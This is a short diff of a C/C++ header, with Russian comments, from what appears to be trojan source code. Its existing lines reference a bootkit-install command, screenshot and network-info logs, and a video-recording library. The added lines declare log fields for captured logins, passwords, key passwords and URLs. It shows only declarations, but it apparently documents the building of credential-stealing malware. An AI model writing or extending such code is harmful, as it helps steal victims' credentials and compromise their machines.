@@ -112,7 +112,14 @@ extern CSSTR EStrCommandInstallBootkit[];  // Команда на инсталяцию буткита
 extern CSSTR StrLogFileScreenShot[];
 extern CSSTR StrLogFileInformation[];
 extern CSSTR StrLogFileNetInfo[];
+extern CSSTR EStrLogKeyPath[];
 
+
+// Имяена полей лога
+extern CSSTR EStrLogFieldLogin[];
+extern CSSTR EStrLogFieldPassword[] ;
+extern CSSTR EStrLogFieldKeyPassword[] ;
+extern CSSTR EStrLogFieldURL[];
 
 
 // Имена функций библиотеки видеозаписи.
